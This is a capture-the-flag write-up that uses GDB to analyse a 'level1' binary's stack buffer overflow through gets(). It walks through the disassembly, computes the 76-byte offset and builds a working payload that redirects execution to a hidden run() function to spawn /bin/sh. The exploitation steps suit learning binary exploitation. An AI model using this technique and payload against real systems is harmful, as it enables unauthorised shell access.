# Level1 - ASM Analysis (GDB only)

## Introduction

This file complements `walkthrough.md` by providing a low-level analysis of the `level1` binary using **GDB only**.

We focus on analyzing and exploiting a classic **buffer overflow** vulnerability.

---

## What is a Buffer Overflow?

A buffer overflow happens when a program writes more data to a buffer (a fixed-size region of memory) than it can hold.

When this occurs in stack-allocated buffers, the overflow may overwrite adjacent memory such as:

* Local variables
* The saved base pointer (EBP)
* Most importantly: the **return address** (EIP)

Overwriting the return address allows us to **redirect program execution** to any address we choose including injected code (shellcode) or existing functions (e.g., `system()`).

Example in C:

```c
void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // Dangerous: no length check
}
```

If `input` is longer than 64 bytes, it overwrites `buffer`, potentially reaching and modifying the return address.

---

## Prerequisites for Exploitation

Before exploiting a buffer overflow, we must ensure that the environment is exploitable:

### 1. No Address Space Layout Randomization (ASLR)

ASLR randomizes memory addresses, making reliable exploitation difficult.

Check:

```bash
$ cat /proc/sys/kernel/randomize_va_space
0
```

### 2. Check for Stack Protections

Many binaries are compiled with protections like **stack canaries**, **NX (non-executable stack)**, or **PIE**.

To inspect binary protections:

```bash
$ checksec --file ./level1
```

Example output:

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./level1
```

For exploitation:

* Canary: **must be absent** or bypassed
* NX: **must be disabled** (allows shellcode execution)
* PIE: **ideally absent** (predictable function addresses)

Given these results, our environment appears suitable for a classic buffer overflow attack.

*Next: We’ll disassemble `main()` and `run()` with GDB and walk through the vulnerable code.*

# Disassembly Analysis

## Functions Identified

Using the `info functions` command in GDB, we identify the following relevant symbols:

```
0x08048444  run
0x08048480  main
```

These are the two application-specific functions relevant to our analysis. We will now examine each one line by line.

---

## Disassembly of `run`

### Function Prologue

```
0x08048444 <+0>:     push   %ebp
0x08048445 <+1>:     mov    %esp,%ebp
0x08048447 <+3>:     sub    $0x18,%esp
```

<+0> to <+3>: Standard function prologue.

* `<+0>` Save old base pointer.
* `<+1>` Set new base pointer.
* `<+3>` Reserve 24 bytes on the stack for local variables.

---

### Prepare `fwrite("Good...", 1, 19, stdout)`

```
0x0804844a <+6>:     mov    0x80497c0,%eax
0x0804844f <+11>:    mov    %eax,%edx
```

<+6> to <+11>: Load `stdout` into `edx`.

* `<+6>` Move the value at address `0x80497c0` into `eax`. This points to `stdout`.
* `<+11>` Copy it into `edx`.

```
0x08048451 <+13>:    mov    $0x8048570,%eax
```

<+13>: Load address of message string into `eax`.

* `0x8048570` likely points to `"Good... Wait what?\n"`

```
0x08048456 <+18>:    mov    %edx,0xc(%esp)
```

<+18>: Set fourth argument (FILE \*stream) for `fwrite()`.

```
0x0804845a <+22>:    movl   $0x13,0x8(%esp)
```

<+22>: Set third argument (size\_t count = 19).

```
0x08048462 <+30>:    movl   $0x1,0x4(%esp)
```

<+30>: Set second argument (size\_t size = 1).

```
0x0804846a <+38>:    mov    %eax,(%esp)
```

<+38>: Set first argument (const void \*ptr) = address of message string.

```
0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
```

<+41>: Call `fwrite()` with the prepared arguments.

---

### Execute `system("/bin/sh")`

```
0x08048472 <+46>:    movl   $0x8048584,(%esp)
```

<+46>: Set argument for `system()` pointer to `"/bin/sh"`.

```
0x08048479 <+53>:    call   0x8048360 <system@plt>
```

<+53>: Execute shell.

---

### Function Epilogue

```
0x0804847e <+58>:    leave
0x0804847f <+59>:    ret
```

<+58> to <+59>: Clean up stack and return.

---

## Disassembly of `main`

### Function Prologue

```
0x08048480 <+0>:     push   %ebp
0x08048481 <+1>:     mov    %esp,%ebp
0x08048483 <+3>:     and    $0xfffffff0,%esp
0x08048486 <+6>:     sub    $0x50,%esp
```

<+0> to <+6>: Standard prologue with stack alignment.

* `<+0>` Save old base pointer.
* `<+1>` Set new base pointer.
* `<+3>` Align `esp` to 16 bytes.
* `<+6>` Allocate 0x50 = 80 bytes of stack space.

---

### Vulnerable `gets()` Call

```
0x08048489 <+9>:     lea    0x10(%esp),%eax
```

<+9>: Compute address of buffer (esp + 0x10) and store it in `eax`.

```
0x0804848d <+13>:    mov    %eax,(%esp)
```

<+13>: Place the buffer address as the first argument for `gets()`.

```
0x08048490 <+16>:    call   0x8048340 <gets@plt>
```

<+16>: Call the unsafe `gets()` function.

> `gets()` does not perform bounds checking, making it vulnerable to buffer overflows.

---

### Function Epilogue

```
0x08048495 <+21>:    leave
0x08048496 <+22>:    ret
```

<+21> to <+22>: Clean up stack and return.

---

The stack buffer is 80 bytes large. If we input more than 80 bytes, we can overwrite the return address and redirect execution to `run()`.

*Next step: we will confirm the offset to the return address and use GDB to validate control flow redirection.*

# GDB Runtime Analysis

## Step-by-Step Runtime Inspection with GDB

We will now use GDB to confirm the following:

* Location of the vulnerable buffer.
* Offset to overwrite the return address.
* Redirection of execution to the `run()` function.

---

### 1. Start GDB and break before `gets()`

First, we identify where user input is read. From our disassembly, we know that the program uses the unsafe `gets()` function to read input into a buffer:

```bash
$ gdb ./level1
(gdb) break *0x08048490   # sets breakpoint at call to gets()
(gdb) run
```

Once the breakpoint is hit, we are paused just before user input is read:

```
Breakpoint 1, 0x08048490 in main ()
```

---

### 2. Finding the buffer offset manually with GDB

To determine how many bytes are needed to reach the return address (EIP), we calculate the distance between the buffer and the saved return address directly on the stack.

In the x86 calling convention, local buffers are typically placed at an offset relative to `$esp`, and the saved return address is located at `[$ebp+4]`.

So the distance between the start of the buffer and the return address is:

```bash
(gdb) print ($ebp+4) - ($esp+0x10)
$1 = 76
```

This gives us the exact number of bytes to overflow the buffer and reach EIP: **76 bytes**.

This approach avoids assumptions and is based purely on observing the actual stack layout at runtime.

Note: The decompiled source of `main()` in `decompiled_level1/main.c` confirms this finding, where the buffer is declared as:

```c
char local_50[76];
```

---

### 3. Alternative method using a pattern tool

Another way to compute the offset is to use cyclic pattern generation and offset discovery tools, such as those from Metasploit:

```bash
$ msf-pattern_create -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2...
```

Feed the pattern to the binary:

```bash
(gdb) run
Starting program: /home/user/level1/level1
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2...
```

It crashes:

```
Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
```

Launch GDB and inspect EIP:

```bash
(gdb) info registers eip
```

```
eip            0x63413563       0x63413563
```

Then back on your host:

```bash
$ msf-pattern_offset -q 0x63413563
[*] Exact match at offset 76
```

This confirms what we found manually.

---

### 4. Find the address of the `run()` function

```bash
(gdb) info functions run
0x08048444  run
```

---

### 5. Final Payload Construction

We observed earlier that run() is located at 0x08048444, so this address is appended at the end of our payload.
At this point, we are ready to overwrite the return address and jump to `run()` at `0x08048444`.

#### Method 1: Using a file

We generate the payload using Python 2:

```bash
$ python -c 'print "A" * 76 + "\x44\x84\x04\x08"' > /tmp/payload
```

Then run the binary through GDB:

```bash
$ gdb ./level1
(gdb) run < /tmp/payload
```

Expected output:

```
Good... Wait what?
Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
```

This indicates that the shell was launched but exited immediately due to lack of interactive input.  
This behavior is typical when the shell's stdin is closed immediately after being invoked

#### Keeping the shell open interactively

Outside of GDB, we can instead use:

```bash
$ cat /tmp/payload - | ./level1
```

Using `-` ensures that the standard input remains open after sending the payload, allowing the spawned shell to stay interactive.

---

## Conclusion

Through step-by-step runtime analysis in GDB, we confirmed that the binary:

* Reads user input into a stack-allocated buffer using the unsafe `gets()` function.
* Does not enforce bounds checking, allowing us to overwrite the saved return address.
* Contains a hidden function, `run()`, which calls `system("/bin/sh")`.

By crafting a payload with exactly **76 bytes of filler**, followed by the address of `run()`, we redirected the program’s execution flow and successfully triggered the shell.

We also learned that **redirecting input via a file descriptor (e.g. ****\`\`****) causes stdin to close**, preventing interaction with the spawned shell. Using `cat /tmp/payload - | ./level1` preserves stdin and gives us a usable shell.

This level demonstrates a classic stack-based buffer overflow exploit, and reinforces the importance of understanding memory layout and program flow when performing binary exploitation.


